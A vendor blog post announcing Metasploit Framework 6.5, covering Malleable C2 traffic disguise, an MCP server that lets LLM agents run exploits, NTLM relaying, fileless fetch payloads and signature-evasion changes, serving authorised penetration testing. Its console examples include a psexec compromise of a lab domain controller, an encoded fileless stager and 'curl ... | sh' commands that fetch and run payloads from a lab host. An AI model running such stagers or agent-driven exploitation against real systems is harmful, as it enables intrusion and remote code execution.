---
schema_version: "1.0.0"
document_id: "9601241fefed2dd57f989549c64803cb1f9085f215b567ea1341553efa5a462d"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/pt-metasploit-framework-6-5-released"
published_at: "2026-07-30T14:29:54+00:00"
first_seen_at: "2026-07-31T17:52:26.401864+00:00"
fetched_at: "2026-07-31T17:52:28.126602+00:00"
content_hash: "sha256:e11d5bf71e3b7c3ad09e0d767b0c5b480a593cd6d695efa0403453a52a66c79b"
---

# Metasploit Framework 6.5 Released

Today we’re proud to announce that Metasploit Framework version 6.5 has been released. Over the past two years, with the help of countless contributors, we’ve added 422 new modules along with a whole slew of new features.


## Malleable C2 Profiles for HTTP


One of the latest and most requested features is support for Malleable C2 profiles across all current Meterpreter payloads. This feature enables users to load a standard profile into Meterpreter and change the shape of its HTTP(S) traffic. All Meterpreters, including Windows, Java, Python, PHP and Linux, have been updated with this functionality. Due to the size restrictions on staged payloads, staged payloads will only use the Malleable C2 configuration once the stage has been loaded. Since stageless payloads skip the download phase, they immediately use the Malleable C2 configuration.


When a compatible payload has been selected, the user only needs to set the MALLEABLEC2


option to the profile on disk. The syntax for profiles is the same as in other tools which ensures that Metasploit is capable of loading[publicly](http://github.com/BC-SECURITY/Malleable-C2-Profiles) available profiles. While not all of the directives are currently in use, additional improvements will be made in the future.


In the following example, an HTTP Meterpreter is deployed with a profile to emulate browsing Amazon.


```text
msf exploit(windows/smb/psexec) > set PAYLOAD windows/x64/meterpreter_reverse_http
PAYLOAD => windows/x64/meterpreter_reverse_http
msf exploit(windows/smb/psexec) > set MALLEABLEC2 amazon.profile
MALLEABLEC2 => amazon.profile
msf exploit(windows/smb/psexec) > run
[*] Started HTTP reverse handler on http://192.168.159.128:8081/
[*] 192.168.159.10:445 - Connecting to the server...
[*] 192.168.159.10:445 - Authenticating to 192.168.159.10:445 as user 'smcintyre'...
[!] 192.168.159.10:445 - peer_native_os is only available with SMB1 (current version: SMB3)
[*] 192.168.159.10:445 - Uploading payload... BqjvmNxF.exe
[*] 192.168.159.10:445 - Created \BqjvmNxF.exe...
[+] 192.168.159.10:445 - Service started successfully...
[*] 192.168.159.10:445 - Deleting \BqjvmNxF.exe...
[*] http://192.168.159.128:8081/ handling request from 192.168.159.10; (UUID: lh15pukd) Redirecting stageless: URI '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books' with UA 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' -> UUID NjFswaV1VEGJ1ojU44aMCAHc2CTIr56KDkzFLcyRHZ8Go9fwFFaBp8QSiN6WYHoH5j-Oz81kEMXA9tYzxcpvs5e
[*] http://192.168.159.128:8081/ handling request from 192.168.159.10; (UUID: lh15pukd) Attaching orphaned/stageless session...
[*] Meterpreter session 3 opened (192.168.159.128:8081 -> 192.168.159.10:49853) at 2026-07-09 16:34:39 -0400


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DC
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MSFLAB
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter >
```


For more information, usage instructions, and what profile verbs are supported, see the[Malleable C2 documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html) .


## Metasploit Framework 6.5 Release - MCP Server


Metasploit 6.5 introduces the Metasploit MCP Server ( msfmcpd


), a new middleware layer designed to facilitate secure, structured interactions between AI applications and the Metasploit Framework. By leveraging the Model Context Protocol, the server exposes 16 standardized tools—ranging from complex reconnaissance queries to active session management—allowing users to integrate Metasploit’s powerful capabilities directly into AI-driven environments like Claude or Cursor.


### Toolset Categorization


The toolset is partitioned into two distinct categories to prioritize operator oversight:


- **Read-Only Tools:** These 12 tools are available by default and provide deep access to the Framework's intelligence. This includes modules for searching available exploits, querying discovered host/service data, retrieving stored credentials, and monitoring active jobs or sessions. These tools allow an LLM to provide situationally aware advice without modifying the state of the target environment. Perfect for use in sensitive environments where full AI autonomy is barred.
- **Dangerous Tools:** To ensure safety, these 4 high-impact tools are disabled by default. This class includes methods for executing modules, using module checks, stopping sessions, and writing data to interactive sessions (like Meterpreter). To leverage these for automated exploitation, operators must explicitly enable them via CLI flag ( --enable-dangerous-actions


), environment variable, or configuration key.


### Example LLM Workflow


With the MCP server configured, an LLM agent can automate parts of the penetration testing and vulnerability validation lifecycle. A typical workflow might look like this:


1. **Reconnaissance:** The LLM uses msf_host_info


and msf_service_info


to identify potential targets and msf_search_modules to find relevant exploits matching the target’s service versions.
2. **Validation:** Upon selecting a module, the agent calls msf_module_check


(if enabled) to assess the target's susceptibility without triggering a full exploit attempt.
3. **Exploitation:** If the check confirms vulnerability, the agent proceeds with msf_module_execute


, passing the necessary datastore options.
4. **Interaction:** Once a session is established, the agent uses msf_session_list


to verify the connection and msf_session_read to parse session output, allowing it to interpret the environment and potentially msf_session_write


commands to further the engagement.


This structure allows security professionals to offload repetitive telemetry gathering to AI agents while retaining a strict, policy-driven "human-in-the-loop" gate for all offensive actions.


### Starting the MCP Server


You can start the server using the msfmcpd binary or directly within msfconsole:


```text
msf > load mcp
msf > mcp --help
```


#### Usage


```text
msf > mcp <subcommand> [options]
```


#### Subcommands:


- status


: Display MCP server status
- start


: Start the MCP server
- stop


: Stop the MCP server
- restart


: Restart the MCP server
- help


: Show this help message


#### Common Options:


- ServerHost=<host>


: Bind address (default: localhost)
- ServerPort=<port>


: MCP port (default: 3000)
- DangerousActions=<true|false>


: Enable destructive tools (default: false)
- RpcHost,RpcPort,RpcUser,RpcPass,RpcSSL


: RPC configuration settings.
- RateLimit=<n>


: Requests per minute (default: 60)


#### Examples:


```text
msf > mcp start
msf > mcp start ServerPort=8080
msf > mcp start RpcUser=msf RpcPass=secret
```


## Relaying Improvements


Over the past few years, Metasploit has been making incremental improvements to its NTLM relaying capabilities. While NTLM is considered a legacy authentication protocol, it remains commonly deployed in enterprise environments. This release continues that trend by adding the second NTLM relay server to the framework; HTTP(S). Users can now start a malicious HTTP server that will prompt for authentication and relay it to one or more user-specified targets.


Users can leverage this capability with the new auxiliary/server/relay/http_to_smb


and auxiliary/server/relay/http_to_ldap


modules. These will open SMB and LDAP sessions respectively and allow the user to interact with the target server in the context of the user whose credentials were relayed. Interactive protocol sessions have been around for a couple of years now and offer users a more fault-tolerant way to interact with targets when compared to the old “only psexec” option. SMB sessions have also been updated with sessions -u support, enabling users to upgrade an interactive SMB session to a Meterpreter session using psexec when desired.


### NTLMRelay2Self


The new capability to relay from an HTTP server to another target opens the possibility for unique attack workflows. One such technique is known as NTLMRelay2Self. This multi-step workflow involves coercing a target to authenticating to itself over HTTP which creates a relaying opportunity. After exploiting that relay opportunity, an attacker can establish an LDAP session to a domain controller, authenticated as the machine account. From this position they can leverage RBCD or Shadow Credentials to elevate their permissions on the target workstation (not the domain controller).


While all of these steps can be performed manually, Metasploit added a new exploits/windows/local/ntlm_relay_2_self


module to automate this entire process, performing the relay step as well as the others in a single action. This particular attack technique does not have a patch but does require a local user on a domain joined workstation in order to exploit; effectively making it an evergreen LPE.


## Fetch Payload Improvements


Fetch payloads were created to support users in writing exploits targeting the wave of new command injection vulnerabilities we saw coming in several years ago. They allow a user to generate a small command-based stager that runs on a target host and calls back to download a full binary payload to run it, giving users the ability to launch a fully-featured binary (EXE, ELF, or DLL) payload using only a single command injection. Three new features we added to extend the utility for Fetch Payloads to our users include Fileless Fetch Payloads, Pipe Fetch Payloads, and support for a new multi pseudoarchitecture payload. Fileless Fetch payloads are wonderfully named; previously, when the Fetch command stager ran, the binary payload was saved to a location on disk and launched. Fileless Fetch Payloads leverage a feature within the Linux Kernel after 3.17 that allows us to write a file directly to memory using the memfd_create syscall and execute it, so no files ever touch the target disk. There are three supported ways to use Fetch Fileless: Python3.8+, shell, and shell-search. Each uses a different technique to create a file in memory and launch it.


Fetch Pipe was created in response to several exploits that we discovered had very small command size requirements, and we found ourselves trying to shrink the command to fetch the binary payload. Fetch Pipe Payloads simply add an extra Fetch command stager so that the user only needs to run a very small command on the remote host that requests a larger command, which, in turn, requests the binary payload. It allowed us to drop the size of the payloads dramatically, and opened the door to create more complex and feature-rich Fetch command stagers since we could use the tiny “pre-stager” rather than a stager with added length, complexity, and encoding requirements.


For example, here we generate the command for a fileless fetch payload:


```text
msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
[*] Command to execute on target: echo -n 'd3JpdGVieXRlcyAoKSB7IHByaW50ZiBcXCUwM28gIiRAIiA7IH07dmRzb19hZGRyPSQoKDB4JChncmVwIC1GICJbdmRzb10iIC9wcm9jLyQkL21hcHMgfCBjdXQgLWQnLScgLWYxKSkpO2ptcD0iNDhiOCIkKGVjaG8gJChwcmludGYgJTAxNnggJHZkc29fYWRkcikgfCByZXYgfCBzZWQgLUUgJ3MvKC4pKC4pL1wyXDEvZycpImZmZTAiO3NjPSc0ODMxZjY1NjU0NWY0OGM3YzBjMWZlZmZmZjQ4ZjdkODBmMDU0ODg5YzdiMDRkMGYwNTZhMjI1ODBmMDUnO3JlYWQgc3lzY2FsbF9pbmZvIDwgL3Byb2Mvc2VsZi9zeXNjYWxsO2FkZHI9JCgoJChlY2hvICRzeXNjYWxsX2luZm8gfCBjdXQgLWQnICcgLWY5KSkpO2V4ZWMgMz4vcHJvYy9zZWxmL21lbTtkZCBicz0xIHNraXA9JHZkc29fYWRkciA8JjMgPi9kZXYvbnVsbCAyPiYxO3ByaW50ZiAiJCh3cml0ZWJ5dGVzIGBwcmludGYgJHNjIHwgc2VkICdzLy5cezJcfS8weCYgL2cnYCkiID4mMztleGVjIDM+Ji07ZXhlYyAzPi9wcm9jL3NlbGYvbWVtO2RkIGJzPTEgc2tpcD0kYWRkciA8JjMgPi9kZXYvbnVsbCAyPiYxO3ByaW50ZiAiJCh3cml0ZWJ5dGVzIGBwcmludGYgJGptcCB8IHNlZCAncy8uXHsyXH0vMHgmIC9nJ2ApIiA+JjM7' | base64 -d | ${SHELL} & cd /proc/$!;og_process=$!;sleep 2;FOUND=0;if [ $FOUND -eq 0 ];then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];then if $(curl -so $f http://10.5.135.210:8080/20s16UxqPChr1I-hZk-vRg >/dev/null);then $f & FOUND=1;break;fi;fi;done;fi;sleep 2;kill -9 $og_process;
echo -n 'd3JpdGVieXRlcyAoKSB7IHByaW50ZiBcXCUwM28gIiRAIiA7IH07dmRzb19hZGRyPSQoKDB4JChncmVwIC1GICJbdmRzb10iIC9wcm9jLyQkL21hcHMgfCBjdXQgLWQnLScgLWYxKSkpO2ptcD0iNDhiOCIkKGVjaG8gJChwcmludGYgJTAxNnggJHZkc29fYWRkcikgfCByZXYgfCBzZWQgLUUgJ3MvKC4pKC4pL1wyXDEvZycpImZmZTAiO3NjPSc0ODMxZjY1NjU0NWY0OGM3YzBjMWZlZmZmZjQ4ZjdkODBmMDU0ODg5YzdiMDRkMGYwNTZhMjI1ODBmMDUnO3JlYWQgc3lzY2FsbF9pbmZvIDwgL3Byb2Mvc2VsZi9zeXNjYWxsO2FkZHI9JCgoJChlY2hvICRzeXNjYWxsX2luZm8gfCBjdXQgLWQnICcgLWY5KSkpO2V4ZWMgMz4vcHJvYy9zZWxmL21lbTtkZCBicz0xIHNraXA9JHZkc29fYWRkciA8JjMgPi9kZXYvbnVsbCAyPiYxO3ByaW50ZiAiJCh3cml0ZWJ5dGVzIGBwcmludGYgJHNjIHwgc2VkICdzLy5cezJcfS8weCYgL2cnYCkiID4mMztleGVjIDM+Ji07ZXhlYyAzPi9wcm9jL3NlbGYvbWVtO2RkIGJzPTEgc2tpcD0kYWRkciA8JjMgPi9kZXYvbnVsbCAyPiYxO3ByaW50ZiAiJCh3cml0ZWJ5dGVzIGBwcmludGYgJGptcCB8IHNlZCAncy8uXHsyXH0vMHgmIC9nJ2ApIiA+JjM7' | base64 -d | ${SHELL} & cd /proc/$!;og_process=$!;sleep 2;FOUND=0;if [ $FOUND -eq 0 ];then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];then if $(curl -so $f http://10.5.135.210:8080/20s16UxqPChr1I-hZk-vRg >/dev/null);then $f & FOUND=1;break;fi;fi;done;fi;sleep 2;kill -9 $og_process;
```


Here is that same command with fetch_pipe enabled:


```text
msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set fetch_pipe true
fetch_pipe => true
msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set fetch_uripath x
fetch_uripath => x
msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
[*] Command to execute on target: curl -s http://10.5.135.210:8080/x|sh
curl -s http://10.5.135.210:8080/x|sh
```


By enabling the fetch pipe option, our payload to run on the target went from 2,374 characters to 38.


The final new feature added to Fetch Payloads in 6.5 is support for a new multi pseudoarchitecture. The new multi pseudoarchitecture allows users to generate a Fetch payload command stager that will run and report back the architecture of the target host while it requests the binary payload, allowing the Fetch Handler to serve a payload that matches the target architecture. This is incredibly useful during the exploitation of modern Linux hardware, as a Linux host could be running on one of many architectures from x86_64 to ARM. The new multi pseudoarch allows a user to send a payload in an exploit to a Linux host and have it “just work” regardless of the underlying architecture, thus eliminating the users need to know (or correctly guess).


Here is an example of generating a Fetch Multi payload and handler, then running the Fetch command stager on several different Linux targets, each running a different architecture:


```text
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > show options


Module options (payload/cmd/linux/http/multi/meterpreter_reverse_tcp):


Name            Current Setting  Required  Description
----            ---------------  --------  -----------
FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, GET, TFTP, TNFTP,
WGET)
FETCH_DELETE    false            yes       Attempt to delete the binary after execution
FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous
handles, requires Linux ≥3.17 (for Python variant also Python ≥3
.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+
, shell-search, shell)
FETCH_SRVHOST                    no        Local IP to use for serving payload
FETCH_SRVPORT   8080             yes       Local port to use for serving payload
FETCH_URIPATH   x                no        Local URI to use for serving payload
LHOST           10.5.135.210     yes       The listen address (an interface may be specified)
LPORT           4444             yes       The listen port


When FETCH_COMMAND is one of CURL,GET,WGET:


Name        Current Setting  Required  Description
----        ---------------  --------  -----------
FETCH_PIPE  true             yes       Host both the binary payload and the command so it can be piped dire
ctly to the shell.


When FETCH_FILELESS is none:


Name                Current Setting  Required  Description
----                ---------------  --------  -----------
FETCH_FILENAME      cldOGvRDplZ      no        Name to use on remote system when storing payload; cannot co
ntain spaces or slashes
FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


View the full module info with the info, or info -d command.


msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > to_handler
[*] Command to execute on target: curl -s http://10.5.135.210:8080/x|sh
[*] Payload Handler Started as Job 0


[*] Fetch handler listening on 10.5.135.210:8080
[*] HTTP server started
[*] Adding resource /csmCra8lnQTHxFXkipQC0w
[*] Adding resource /x
[*] Started reverse TCP handler on 10.5.135.210:4444
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > [*] Client 10.5.132.212 requested /x
[*] Sending payload to 10.5.132.212 (curl/8.13.0-rc3)
[*] Client 10.5.132.212 requested /csmCra8lnQTHxFXkipQC0w?arch=armv7l
[*] Sending payload to 10.5.132.212 (curl/8.13.0-rc3)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for armle arch
[*] Meterpreter session 1 opened (10.5.135.210:4444 -> 10.5.132.212:45068) at 2026-07-14 11:33:18 -0500
[*] Client 10.5.132.214 requested /x
[*] Sending payload to 10.5.132.214 (curl/8.11.0)
[*] Client 10.5.132.214 requested /csmCra8lnQTHxFXkipQC0w?arch=aarch64
[*] Sending payload to 10.5.132.214 (curl/8.11.0)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for aarch64 arch
[*] Meterpreter session 2 opened (10.5.135.210:4444 -> 10.5.132.214:39894) at 2026-07-14 11:33:26 -0500
[*] Client 10.5.132.224 requested /x
[*] Sending payload to 10.5.132.224 (curl/7.52.1)
[*] Client 10.5.132.224 requested /csmCra8lnQTHxFXkipQC0w?arch=mips64
[*] Sending payload to 10.5.132.224 (curl/7.52.1)
[*] Dynamic Payload Detected, expecting a Query String in the request...
[*] Building payload for mips64 arch
[*] Meterpreter session 3 opened (10.5.135.210:4444 -> 10.5.132.224:53506) at 2026-07-14 11:33:41 -0500


msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) > sessions -C sysinfo
[*] Running 'sysinfo' on meterpreter session 1 (10.5.132.212)
Computer     : kali-raspberrypi
OS           : Debian  (Linux 5.15.44-Re4son-v7+)
Architecture : armv7l
BuildTuple   : armv5l-linux-musleabi
Meterpreter  : cmd/linux
[*] Running 'sysinfo' on meterpreter session 2 (10.5.132.214)
Computer     : kali-raspberrypi
OS           : Debian  (Linux 5.15.44-Re4son-v8l+)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : cmd/linux
[*] Running 'sysinfo' on meterpreter session 3 (10.5.132.224)
Computer     : ubnt
OS           : Debian 9.13 (Linux 4.9.79-UBNT)
Architecture : mips64
BuildTuple   : mips64-linux-muslsf
Meterpreter  : cmd/linux
msf payload(cmd/linux/http/multi/meterpreter_reverse_tcp) >
```


As you can see, the same short command ( curl -s http://10.5.135.210:8080/x|sh


) with the same handler serves the corresponding binary payload to ARMLE, AARCH64, and MIPS64-based Linux hosts.


## Block API Hashes Are Randomized


The block API


is a critical piece of shellcode that is the foundation of all of Metasploits 32-bit and 64-bit payloads. It enables the shellcode author to invoke win32 API methods using a 32-bit hash of the method and module name. It’s been over 5 years since[Metasploit started randomizing](https://github.com/rapid7/metasploit-framework/pull/13832) this piece of shellcode so its 140+ static were no longer trivial signature fodder. What remained however was the 32-bit API hash, whose usage was periodically the subject of various reports. This year, Metasploit updated the block API itself to allow the 32-bit hashes to also be randomized. Now each time the block API is generated, not only are the instructions shuffled but the hash used to invoke win32 API methods are randomized.


## ATT&CK Metadata


When you have about 4500 exploit auxiliary and post modules, discoverability can be a real problem. One thing Metasploit often deals with is ensuring that users have optimal means to find what they are looking for. Historically this has manifested itself as search improvements and even an[fzf plugin](https://github.com/rapid7/metasploit-framework/blob/master/plugins/fzuse.rb) . One thing users often need to do however is emulate real world threat actors. A substantial amount of threat intelligence[provides these](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain/#:~:text=the%20lineage%20assessment.-,Mitigation%20guidance,-MITRE%20ATT%26CK) techniques while documenting the attack chains. Metasploit has begun tagging our own modules with ATT&CK tags to enable users to easily find modules that leverage a particular technique. To search for a module, use the att&ck


search modifier. For example to find all modules that leverage[T1059.001 (Command and Scripting Interpreter: PowerShell)](https://attack.mitre.org/techniques/T1059/001/) use att&ck:T1059.001


. The hierarchy is also honored, so to search more broadly for[T1059 (Command and Scripting Interpreter)](https://attack.mitre.org/techniques/T1059/) use att&ck:T1059


and additional modules such as exploit/windows/mysql/mysql_mof will be included in the search results.


## Conclusion


Metasploit 6.5 represents an evolution in the framework, delivering a wide array of new capabilities designed to improve both usability and the realism of modern security testing. From the highly requested integration of Malleable C2 profiles and our new Metasploit MCP Server to advanced NTLM relaying, enhanced fetch payload utilities, and the introduction of MITRE ATT&CK tagging, this release is built to support increasingly complex and automated workflows. We look forward to seeing how these tools help our community continue to push the boundaries of vulnerability validation and threat emulation. Thank you to all the contributors who helped make this release possible.
